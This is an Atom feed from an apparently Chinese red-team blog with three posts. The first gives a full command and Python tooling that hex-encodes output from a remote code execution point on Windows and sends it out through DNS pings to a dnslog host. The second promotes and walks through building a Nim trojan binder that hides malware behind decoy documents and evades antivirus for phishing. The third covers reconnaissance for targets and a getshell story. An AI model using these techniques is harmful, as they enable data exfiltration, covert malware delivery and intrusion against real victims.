<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>617Sec 胡乱写的一些东西</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-02-28T02:19:06.825Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>cYxSec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Windows下DNS出网的命令回显技巧</title>
    <link href="http://example.com/2022/07/05/Windows%E4%B8%8BDNS%E5%87%BA%E7%BD%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7/"/>
    <id>http://example.com/2022/07/05/Windows%E4%B8%8BDNS%E5%87%BA%E7%BD%91%E7%9A%84%E5%91%BD%E4%BB%A4%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7/</id>
    <published>2022-07-05T04:13:41.000Z</published>
    <updated>2023-02-28T02:19:06.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows下DNS出网的命令回显技巧"><a href="#Windows下DNS出网的命令回显技巧" class="headerlink" title="Windows下DNS出网的命令回显技巧"></a>Windows下DNS出网的命令回显技巧</h1><p>最近遇见了很多仅DNS出网的极限环境，简单研究了个还算通用的利用DNSLog的回显Trick，全当抛砖引玉，不喜勿喷。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在实战中，命令执行总能遇见各种各样的环境，无回显且仅DNS出网的环境也能占个大多数。仅DNS出网的环境一般利用编码+DNSLog就可以解决回显问题。</p><p>通用指的是在server2003（无powershell）环境也能用。</p><p>windows自带的encode只有certutil</p><p><img src="/img/artical/3/1.png"></p><p><img src="/img/artical/3/2.png"></p><p>certutil自带了base64和hex两种encode方法</p><h2 id="0x01-base64-encode存在的问题"><a href="#0x01-base64-encode存在的问题" class="headerlink" title="0x01 base64-encode存在的问题"></a>0x01 base64-encode存在的问题</h2><ul><li>特殊字符。+，/ （无powershell环境处理替换非常麻烦）</li><li>单行长度。dns域名长度限制63个。certutil-encode后单行字符长度为64，需要将一行分割为两段带出。（无powershell需要cmdshell套用循环操作，十分繁琐）</li></ul><p><img src="/img/artical/3/3.png"></p><ul><li>云服务器DNS问题</li></ul><p><img src="/img/artical/3/4.png"></p><p><strong>腾讯云的DNS服务器存在强转小写问题，手头没阿里服务器，不过测试了阿里的DNS（223.5.5.5）也存在一样的问题。</strong></p><p>以上原因在我研究的时候，最终放弃了base64-encode的方案。（尤其是最后一条强转小写的问题）</p><h2 id="0x02-hex-encode方案"><a href="#0x02-hex-encode方案" class="headerlink" title="0x02 hex-encode方案"></a>0x02 hex-encode方案</h2><p>先看encode结果。</p><p><img src="/img/artical/3/5.png"></p><p>对比base64的，主要优点：</p><ul><li>无特殊字符。</li><li>单行长度为32字符。</li><li>无需考虑大小写。</li><li><strong>无需考虑不同条数数据外带存在延时。</strong>（外带记录会带出前4位表示数据位置的字符：0000）</li></ul><p>但是一次dns只能带出来16个字符回显，效率有点低。</p><p>接下来只需要利用cmdshell语法，将中间的字符取出来即可。</p><pre><code class="tsx">for /f &quot;tokens=1-17&quot; %a in (result.txt) do echo %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q</code></pre><p><img src="/img/artical/3/6.png"></p><p>在encode的最后一行可能因为字符不足导致存在特殊字符：</p><p><img src="/img/artical/3/7.png"></p><p>在写入的命令txt后追加部分字符后再encode即可解决此问题。</p><p>just like:</p><pre><code class="powershell">ipconfig &gt; ipconfig &amp;&amp;echo 11111111111&gt;&gt;ipconfig</code></pre><p>最后一行DNSLog记录会以0d0a3131结尾，很容易判断了。</p><p>最终命令:</p><pre><code class="powershell">command &gt; command &amp;&amp;echo 11111111111&gt;&gt;command &amp;&amp; certutil -encodehex command command.txt &amp;&amp; for /f &quot;tokens=1-17&quot; %a in (command.txt) do start /b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.dnslog.cn &amp;&amp; del command &amp;&amp; del command.txt </code></pre><h2 id="0x03-自动化食用"><a href="#0x03-自动化食用" class="headerlink" title="0x03 自动化食用"></a>0x03 自动化食用</h2><p>因为外带的数据条数实在太大，就顺便自动化下。</p><p>一个生成命令，另一个脚本用来监听dnslog平台并做格式化输出</p><p>CommandGen.py</p><pre><code class="python">import syscommandTem = r&#39;command &gt; command7 &amp;&amp;echo 11111111111&gt;&gt;command7 &amp;&amp; certutil -encodehex command7 command7.txt &amp;&amp; for /f &quot;tokens=1-17&quot; %a in (command7.txt) do start /b ping -nc 1 %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.command.&#123;0&#125; &amp;&amp; del command7 &amp;&amp; del command7.txt&#39;with open(&#39;config617&#39;, &#39;r&#39;) as f:    command = commandTem.format(f.readlines()[0])    if __name__ == &#39;__main__&#39;:    if len(sys.argv)&lt;2:        print(&#39;usage: python3 CommandGen.py Yourcommand No(start)&#39;)        print(&#39;like: python3 CommandGen.py whoami (Command will use &quot;start&quot;.Start will Send a large number of requests in a short period of time, resulting in lost DNSLog record)&#39;)        print(&#39;like: python3 CommandGen.py whoami no (Will No start)&#39;)        sys.exit(0)    if len(sys.argv) == 2:        print(command.replace(&#39;command&#39;,sys.argv[1]))    else:        print(command.replace(&#39;command&#39;,sys.argv[1]).replace(&#39;start /b&#39;,&#39;&#39;))</code></pre><p>hexDnsEcho.py</p><pre><code class="python">import timeimport requestsimport jsonimport binasciirequestTime = 6 # DNSLog platform interval per requestcommandHex = &#123;&#125;# initialize the configurationdef get_new_config():    global domain,token,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce    url = &#39;http://dig.pm/new_gen&#39;    data = &#123; &#39;domain&#39; : &#39;dns.1433.eu.org.&#39; &#125;    dataResult = json.loads(requests.post(url, data=data).text)    domain = dataResult[&#39;domain&#39;]    token = dataResult[&#39;token&#39;]    with open(&#39;config617&#39;,&#39;w&#39;) as f:        f.write(dataResult[&#39;domain&#39;])    lastFinishTime = time.strftime(&quot;%Y-%m-%d %X&quot;, time.localtime()) # record last finish time    commandStartPos = 0    commandEndPos = 0    lastRecordLen = 0    finishOnce = False    # get DNSLog data def get_dnslogdata() -&gt; list:    if commandStartPos and commandEndFlag:         commandHex[commandName].extend([result[length-1][1][&#39;subdomain&#39;]                                         for length in range(len(result),commandStartPos,-1)                                         if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7])                                        # Get the command part of the DNSLog data        tempList = []        for length in range(commandStartPos,-1,-1):            if result[length-1][1][&#39;time&#39;] &lt; lastFinishTime:break            if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7:                tempList.append(result[length-1][1][&#39;subdomain&#39;])         commandHex[commandName].extend(tempList)        return commandHex[commandName]# deal with DNSlog data, Format the outputdef deal_data(data: list):    global finishOnce    if commandStartPos and commandEndFlag:        for length in range(commandStartPos,-1,-1):            if result[length-1][1][&#39;time&#39;] &lt; lastFinishTime:break            if result[length-1][1][&#39;subdomain&#39;].count(&#39;.&#39;) == 7:                commandHex[commandName].append(result[length-1][1][&#39;subdomain&#39;])        try:            hexCommand = &#123; item[:4] : item[4:] for item in commandHex[commandName] &#125;             hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))            hexCommand = [ item[1][:32] for item in hexCommand]        except:            print(&#39;!!!!Error Command format! Try to find DNSLog site(http://dig.pm/get_results) to get conntent..&#39;)            pass        hexCommand[-1] = &#39;&#39;.join(hexCommand[-1].split(&#39;0d0a&#39;)[:-1])        commandResult = &#39;&#39;.join(hexCommand)        #print(commandResult)        print(&#39;\n----Command Result----&#39;)        Head = &#39;\033[36m&#39;        End = &#39;\033[0m&#39;        try:            print(Head + binascii.a2b_hex(commandResult).decode(&#39;gb2312&#39;) + End)        except:            print(&#39;Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command&#39;)        print(&#39;----Get Result End!----&#39;)        finishOnce = Trueif __name__ == &#39;__main__&#39;:    get_new_config()    while True:        if finishOnce:               get_new_config()        for i in range(requestTime,-1,-1):            print(&#39;\r&#39;, &#39;Wait DNSLog data: &#123;&#125;s...&#39;.format(str(i)), end=&#39;&#39;)             time.sleep(1)           try:            data = &#123; &#39;domain&#39;:domain, &#39;token&#39;:token &#125;            url = &#39;http://dig.pm/get_results&#39;            #proxies = &#123; &#39;http&#39;:&#39;http://127.0.0.1:8080&#39; &#125;            result = json.loads(requests.post(url, data=data, proxies=False).text)             result = sorted(result.items(), key=lambda x: int(x[0]))        except:            print(&#39;\r&#39;, &#39;Not Find DNSLog Result!&#39;, end=&#39;&#39;)            continue                commandStartFlag = 1 if lastRecordLen == len(result) else 0        lastRecordLen = len(result)        commandEndFlag = 1 if commandEndPos == len(result) else 0         commandEndPos = len(result)                if not commandStartPos and ((result[-1][1][&#39;subdomain&#39;].count(&#39;.&#39;))  == 7 or                                     commandStartFlag):                                     # judge if the DNSLog recording is start            if result[-1][1][&#39;time&#39;] &lt; lastFinishTime:                 print(&#39;\r&#39;, &#39;Not Find DNSLog Result!&#39;, end=&#39;&#39;)                continue                                 commandStartPos = len(result)            commandName = result[-1][1][&#39;subdomain&#39;].split(&#39;.&#39;)[1]            print(&#39;\nFinding Command Record!&#39;)            print(&#39;----Command: \033[36m&#123;&#125;\033[0m----&#39;.format(commandName))            commandHex[commandName] = []             print(&#39;Waiting Command DNSLog Record Finish...&#39;)           if commandStartPos and ((result[-1][1][&#39;subdomain&#39;].count(&#39;.&#39;)) != 7 or                                 commandEndFlag):                                # judge if the DNSLog recording is over            commandEndFlag = 1            #print(&#39;Command DNSLog Record Finish...&#39;)           dataList = get_dnslogdata()        deal_data(dataList)</code></pre><p>用法：</p><p>先运行hexDnsEcho.py，然后运行CommandGen.py生成命令，将生成的命令填写进入RCE点即可。</p><p><img src="/img/artical/3/11.png"></p><p>最终效果</p><p><img src="/img/artical/3/12.png"></p><p><img src="/img/artical/3/13.png"></p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p><strong>研究这个trick还是花了几天时间的，主要是windows的cmd的实现的操作实在是有限，爬了好几天的论坛，要是有师傅们有更好的方法和思路可以再研究交流一波。</strong></p><p><strong>本文全当抛砖引玉，代码也是随手写的，质量不高，不喜勿喷，有问题也欢迎各位师傅指出。</strong></p><p>最后吐槽一下我用的这个DNSLog平台的逆天排序</p><p><img src="/img/artical/3/14.png"></p><p>Code: <a href="https://github.com/Dr-S1x17/NoNetCmdEcho-FileW.e">https://github.com/Dr-S1x17/NoNetCmdEcho-FileW.e</a></p><p>参考链接：<a href="http://www.bathome.net/">http://www.bathome.net</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows下DNS出网的命令回显技巧&quot;&gt;&lt;a href=&quot;#Windows下DNS出网的命令回显技巧&quot; class=&quot;headerlink&quot; title=&quot;Windows下DNS出网的命令回显技巧&quot;&gt;&lt;/a&gt;Windows下DNS出网的命令回显技巧&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="奇技淫巧" scheme="http://example.com/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
    <category term="RCE" scheme="http://example.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>最近看到一个挺有意思的木马捆绑器</title>
    <link href="http://example.com/2021/11/07/%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E6%8C%BA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%8D%86%E7%BB%91%E5%99%A8/"/>
    <id>http://example.com/2021/11/07/%E6%9C%80%E8%BF%91%E7%9C%8B%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E6%8C%BA%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%8D%86%E7%BB%91%E5%99%A8/</id>
    <published>2021-11-07T04:13:41.000Z</published>
    <updated>2021-11-07T07:01:23.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="最近看到一个挺有意思的木马捆绑器"><a href="#最近看到一个挺有意思的木马捆绑器" class="headerlink" title="最近看到一个挺有意思的木马捆绑器"></a>最近看到一个挺有意思的木马捆绑器</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>之前遇见一个场景：生成的免杀钓鱼马，在被害人点击完成后，因为没有其他的反应，导致受害人很容易察觉出文件有问题，在还没迁移好进程就丢失了权限，或者在已经迁移好后被做了断网处理，好不容易钓鱼上线的主机权限就丢失了。</p><p>那么要怎么解决这个问题，也就是说怎么把恶意的木马再加上一层正常的行为，让被害者不太会察觉出问题呢？</p><ul><li>当时想的办法是，在加载器中添加点正常逻辑，比如在终端输出点提示信息之类的，让被害人将这些信息认为是程序的逻辑。比如说钓鱼邮件的内容是关于主机安全加固自查工具的时候，在终端输出一些类似于‘当前主机补丁状况良好’、‘当前主机运行权限不足’等等这类提示信息。在上述说的场景的时候也有一定的诱导能力。</li></ul><p>想法已经有了，在实现的时候又遇见了问题，自己的加载器免杀技术不过关，简单的杀软可以过，遇见卡巴之类的过不去。如果参考别人放出来的加载器Demo，又要在后续不断的修改加载器（放出来的参考Demo一段时间就会提取出特征）。</p><h2 id="发现解决方法"><a href="#发现解决方法" class="headerlink" title="发现解决方法"></a>发现解决方法</h2><p>所以这个想法就一直在搁置（其实就是懒），直到某天在公众号看到了一篇文章<a href="https://mp.weixin.qq.com/s/XZFIv3IOc7U_UVukScTnPw">「钓鱼攻击」免杀钓鱼上线捆绑利器</a>，发现可以直接解决我之前遇见的场景。</p><p>简单说一下这篇文章提到的捆绑器，这个捆绑器实现了将自己的木马和图片、Word、Pdf之类的文件进行捆绑，生成一个捆绑好的EXE。在执行EXE后，EXE会将图片、Word之类的进行释放并运行。同时将捆绑的木马释放到指定目录并后台运行，之后再将捆绑的EXE进行删除，文件夹内最后也就只剩下了个释放出来的图片、Word等，极大程度的隐蔽了木马的攻击流程。</p><p>在被害人的视角来看，点击钓鱼程序后，会直接打开一个图片或Word等文件，与钓鱼邮件中的内容相符，被害人可能会认为这是一个正常的邮件放下戒心，更有利于攻击人员的进一步操作。</p><h2 id="项目演示"><a href="#项目演示" class="headerlink" title="项目演示"></a>项目演示</h2><p><a href="https://github.com/evilashz/NimFileBinder">项目地址</a></p><p>项目是作者拿Nim语言写的，这种小众的语言一般免杀的效果会比主流的语言好上不少，同样逻辑的Loader，这种小众语言都不需要混淆就能过部分杀软。</p><p>缺点当然也有，小众语言代表着程序遇见问题时只能照着开发手册去自己寻找，在论坛上很难找到解决办法。</p><p>正常的配置Nim环境即可，这个项目遇见的第三方包都需要自己去下载和编译，Nim有自带的包管理器nimble，也需要自己去下载编译。</p><p>大致流程就是，在github下载nimble和次项目中遇见的第三方包如strfmt、nimcrypto等</p><pre><code>首先编译nimblenim c src/nimble 会在src目录生成nimble.exe，添加环境变量即可之后在对应的第三方包的文件夹下，执行nim install即可安装第三方包</code></pre><p>nim的编译依赖于mingw，在nim的目录下运行finish.exe即可自动进行安装</p><pre><code>nim c -d:release --opt:size NimFileBender.nim编译项目</code></pre><p><img src="/img/artical/2/1.png"></p><p>这个工具操作也比较简单 指定木马和要捆绑的图片文件等，最后随便指定密钥即可完成捆绑</p><p>这个密钥主要作用就是将木马文件进行加密，释放时再解密</p><p>这里为了做演示，我先随便写个弹窗exe</p><p><img src="/img/artical/2/2.png"></p><p>之后按照这个项目的用法将这个弹窗和一个图片捆绑</p><p><img src="/img/artical/2/3.png"></p><p>最终程序运行效果，打开了正常的图片，捆绑的exe也得到了执行</p><p><img src="/img/artical/2/5.png"></p><p><img src="/img/artical/2/4.png"></p><p><img src="/img/artical/2/6.png"></p><p>捆绑后的程序自删除，并把图片资源释放出来</p><h2 id="免杀效果"><a href="#免杀效果" class="headerlink" title="免杀效果"></a>免杀效果</h2><p><img src="/img/artical/2/7.png"></p><p><img src="/img/artical/2/8.png"></p><p><img src="/img/artical/2/9.png"></p><p><img src="/img/artical/2/10.png"></p><p>总之实战情况下完全够用。</p><h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><p>Nim语言的语法与Python类似</p><p>程序的核心就两个函数，一个加密函数，一个编译函数</p><p><img src="/img/artical/2/11.png"></p><p>加密函数将输入的两个文件进行加密并存储</p><p>重点看函数最后这部分，这里定义了一个模版，其实就是又套了一层编译</p><p><img src="/img/artical/2/12.png"></p><p>在这个模版里面定义了主要的行为操作，包括删除文件，复制木马，运行木马等操作</p><p><img src="/img/artical/2/13.png"></p><p>最后的编译函数也就是重新走了下nim编译</p><p><img src="/img/artical/2/14.png"></p><p>整个程序的流程其实挺简单的</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个捆绑器的思路非常有意思，而且编译起来也就3，4M，实战情况下也完全够用</p><p>后续的拓展思路就是利用其他的偏僻语言，写一个类似的就完全满足实战需求了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;最近看到一个挺有意思的木马捆绑器&quot;&gt;&lt;a href=&quot;#最近看到一个挺有意思的木马捆绑器&quot; class=&quot;headerlink&quot; title=&quot;最近看到一个挺有意思的木马捆绑器&quot;&gt;&lt;/a&gt;最近看到一个挺有意思的木马捆绑器&lt;/h1&gt;&lt;h2 id=&quot;序&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="钓鱼" scheme="http://example.com/categories/%E9%92%93%E9%B1%BC/"/>
    
    
    <category term="C2" scheme="http://example.com/tags/C2/"/>
    
  </entry>
  
  <entry>
    <title>浅谈靶标视角的信息收集</title>
    <link href="http://example.com/2020/11/12/%E6%B5%85%E8%B0%88%E9%9D%B6%E6%A0%87%E8%A7%86%E8%A7%92%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2020/11/12/%E6%B5%85%E8%B0%88%E9%9D%B6%E6%A0%87%E8%A7%86%E8%A7%92%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2020-11-12T04:13:41.000Z</published>
    <updated>2021-10-05T07:04:58.049Z</updated>
    
    <content type="html"><![CDATA[<p>在过去的几周里，有幸参与了攻防演练，虽然是作为影子队伍去打靶标，但是在这个过程中也是学到了很多，尤其是针对信息收集的这个问题，自己发现作为靶标去渗透和平时的普通渗透有很大的不同，而靶标的渗透也是更加需要我们信息收集的能力，去发现目标的尽可能多的资产，然后再去发现问题</p><h1 id="寻找资产篇"><a href="#寻找资产篇" class="headerlink" title="寻找资产篇"></a>寻找资产篇</h1><p>我们在开始时，往往只会得到某个靶标的名称，没有给我们具体的所有资产，以下就开始寻找资产的过程</p><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p>直接搜索靶标</p><h2 id="天眼查"><a href="#天眼查" class="headerlink" title="天眼查"></a>天眼查</h2><p><img src="/img/artical/1/sec1.png"></p><p>以阿里巴巴为例子，我们首先在图中的位置就可以获得第一步的信息：邮箱和官网</p><p>获得的官网信息可以进一步进行子域名的探测</p><p>而获得的邮箱也是十分有用的：</p><ul><li>对目标邮箱发送钓鱼邮件</li><li>某些时候天眼查是不显示官网的，这时我们可以查看邮箱的后缀，大部分时邮箱中通常会包含靶标的信息</li><li>在某些小的靶标，可以根据邮箱的名字尝试生成社工字典，对登陆位置进行爆破</li></ul><p><img src="/img/artical/1/sec3.png"></p><p>从天眼查获得靶标的微信公众号信息</p><p>获得公众号就可以在公众号中进一步去寻找资产</p><p><img src="/img/artical/1/sec2.png"></p><p>从天眼查获得的靶标系统的相关信息</p><p>拥有靶标的某些系统的名称，我们就可以在github或使用google hack语法进行搜寻系统信息</p><p><img src="/img/artical/1/sec4.png"></p><p>网站备案信息，可能获得某些边缘资产的域名相关信息</p><p><img src="/img/artical/1/sec5.png"></p><p>股权穿透图，可在其中获得某些子公司的信息，然后再针对子公司进行信息收集</p><h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><p>在微信里直接搜索靶标的小程序相关信息<br>小程序这里也提一点，小程序的测试不单单是可以抓包测服务端的，客户端也是可以测试的，具体的操作方法和步骤可以百度一下看看</p><h2 id="微信搜索"><a href="#微信搜索" class="headerlink" title="微信搜索"></a>微信搜索</h2><p>可以直接搜索相关关键字获取新闻相关信息等</p><h1 id="资产信息进一步获取篇"><a href="#资产信息进一步获取篇" class="headerlink" title="资产信息进一步获取篇"></a>资产信息进一步获取篇</h1><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>针对收集到的资产域名，进行进一步的子域名的收集，通常自己使用的工具就是OneForAll和爆破子域名这两种方式。</p><p><img src="/img/artical/1/sec13.png"></p><p>还有证书透明度（CT）公开日志枚举</p><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><p>一般中型大小的靶标资产主站通常会携带CDN</p><p>自己常用的绕过方式：</p><ul><li>子域名：一般子域名可能不存在CDN，而且大多数情况子域名与主站是同一个站或在C段</li><li>注册接收邮箱：若主站存在用户功能，我们只要接收邮件等，分析靶标邮件服务器的ip，大多数情况邮件服务器也是存在于靶标的C段的</li><li>海外IP Ping：一般靶标针对海外的ip并未做CDN处理</li><li>历史DNS解析记录：查询网站的历史DNS解析</li><li>fofa：一般fofa搜目标的title和证书信息即可</li></ul><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>这里没有太多说的，信息收集的一部分</p><h2 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h2><p>在开始前，分析靶标IP是否是架设在云服务器上的。</p><p>每个资产的C段都可能有大发现，我们可能会在C段发现边缘的、容易发起攻击的资产，而一般的攻击也都是从C段的薄弱位置发起的。</p><p>建议针对每个获取的靶标相关信息的Ip都做一下相关的C段信息资产收集</p><h2 id="旁站"><a href="#旁站" class="headerlink" title="旁站"></a>旁站</h2><p>这个也无需多说</p><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p><img src="/img/artical/1/sec12.png"></p><p>从中获取网站信息，可生成社工字典和获取其他的备案信息网站等</p><h1 id="FOFA篇"><a href="#FOFA篇" class="headerlink" title="FOFA篇"></a>FOFA篇</h1><p>fofa等一众网络空间搜索引擎在我们针对靶标系统进行信息收集时是非常好用的</p><h2 id="常用搜索语法"><a href="#常用搜索语法" class="headerlink" title="常用搜索语法"></a>常用搜索语法</h2><ul><li>title=：查找title中包含指定关键字的资产，也可以用于进行寻找真实IP相关的操作</li><li>body=：查找正文中包含指定关键字的资产</li><li>city=：指定某市的资产</li><li>region=：指定某省的资产</li><li>ip=：收集相关ip的资产，有时候目标存在WAF等，无法进行直接的端口扫描也可以直接借助FOFA的搜索结果直接进行分析</li><li>搜索favicon的图标hash</li></ul><h2 id="搜索技巧"><a href="#搜索技巧" class="headerlink" title="搜索技巧"></a>搜索技巧</h2><p>在使用过程中，我自己也发现了很多的搜索技巧：</p><ul><li>针对上方的天眼查的搜索的系统结果，可以做这样的搜索</li></ul><p><img src="/img/artical/1/sec2.png"></p><p><img src="/img/artical/1/sec6.png"></p><p>如上图，比如我们的靶标地区是北京的，针对阿里我们就可以进行如图所示的搜索</p><ul><li>body的搜索</li></ul><p>其实body中也是很多相关靶标的信息的，比如客服电话，下方存在的公司名字等等，我们搜索body时可以进行这样搜索的</p><p><img src="/img/artical/1/sec7.png"></p><p><img src="/img/artical/1/sec8.png"></p><ul><li>图标hash的搜索，这个不仅可以收集边缘的资产，也可以用于真实IP的查找</li></ul><p><img src="/img/artical/1/sec11.png"></p><p>图标指的就是我们在打开网站时存在于标签位置的图片，默认路径是根目录/favicon.ico</p><p><img src="/img/artical/1/sec9.png"></p><p>直接访问图标路径，然后将下载好的图标进行上传即可</p><p>这里因为自己没有fofa的会员</p><p><img src="/img/artical/1/sec10.png"></p><p>自己有shodan的，在shodan上面搜索一下，这里有一点的就是fofa计算图标的hash的算法与shodan是相同的，具体的是什么算法我也没花时间研究，但是我们可以直接利用FOFA上传图片获取的hash值，在shodan上面进行相同的搜索</p><h1 id="自己的实战信息获取举例"><a href="#自己的实战信息获取举例" class="headerlink" title="自己的实战信息获取举例"></a>自己的实战信息获取举例</h1><p><strong>因项目敏感原因，此处并不放图片，请见谅</strong></p><h2 id="根据图标收集资产"><a href="#根据图标收集资产" class="headerlink" title="根据图标收集资产"></a>根据图标收集资产</h2><p>某次项目，客户要求挖外网漏洞然后尽量先出些报告，资产只要是相关的就可以，自己和同事在接手后就很头疼，因为相关的主站和子域名已经没什么搞头了，也是因为在以前已经做了好几次的漏洞挖掘，而且也是有waf防护，一些中间件的漏洞也是无法直接利用，有的访问路径直接被waf拦截，有的攻击的payload也是无法成功执行。</p><p>常规的子域名和C段也搞了搞，C段的资产也是不出意料的在waf的保护范围之内</p><p>逻辑漏洞暂时不要，弱口令还是可以交的，我丢，这要怎么搞？</p><p>然后就想到了利用图标的hash值先收集收集边缘的资产，最后也是成功在shodan和fofa中寻找到了几个边缘资产，也是在其中发现了不少的弱口令（推测是因为这个资产有的还没有上线，有的也是并不在waf的防护中），activemq和redis等的问题</p><h2 id="利用FOFA获取边缘系统"><a href="#利用FOFA获取边缘系统" class="headerlink" title="利用FOFA获取边缘系统"></a>利用FOFA获取边缘系统</h2><p>某次演练，给的靶标的xxxx端口存在某系统，而且用户名和密码也是直接写在html中，尝试登陆一手，数据库连接失败，登陆不进去，估计是系统的数据库配置文件还没有修改好，在靶标的其他端口，禅道版本较高，用户也爆不出来，其他的也是有几个登陆页面，也是爆破不出用户密码。</p><p>靶标思路停滞，尝试在FOFA中搜索：title=”xx系统”&amp;&amp;city=”xx”，成功搜索出好几个和靶标相同的xxxx端口的xx系统，用户密码也是直接写在了html中，尝试直接登陆，都可以登陆成功。然后就是图片上传出的getshell了。</p><p>巧合的是，在搜索出的系统里面，登陆进入后发现某个结果是靶标的边缘资产。然后就是成功shell，虽然和靶标不是一个内网，但是也可以继续根据shell后查看系统后获得的信息，针对靶标进行进一步的爆破等。</p><p><strong>说一个自己在当时的一个小思路：系统在图片上传处可以getshell，我在shell完边缘资产后直接就想试试把host改成靶标的，会是什么样，当时返回的结果是上传成功的，给我激动坏了，以为能直接把靶标撸下来，也算是个小0day，但是访问后发现靶标上的文件并未成功上传，当时时间匆忙，也就没把这个系统的源码脱下来分析了</strong></p><p>时间充裕的话当然可以把shell后的源码下载分析一下，但是自己时间不是很充裕和当时的环境：后台登陆，功能点非常单一，asp，所以在头像处上传完失败之后也就没做源码审计。</p><p>算是个小思路，但是估计实际中也几乎不太可能遇见这种问题。</p><p>后话：裁判沟通后并没给分，哭了</p><p><strong>参考链接：<a href="https://xz.aliyun.com/t/8578">https://xz.aliyun.com/t/8578</a></strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在过去的几周里，有幸参与了攻防演练，虽然是作为影子队伍去打靶标，但是在这个过程中也是学到了很多，尤其是针对信息收集的这个问题，自己发现作为靶标去渗透和平时的普通渗透有很大的不同，而靶标的渗透也是更加需要我们信息收集的能力，去发现目标的尽可能多的资产，然后再去发现问题&lt;/p&gt;</summary>
      
    
    
    
    <category term="信息收集" scheme="http://example.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="红队" scheme="http://example.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
</feed>
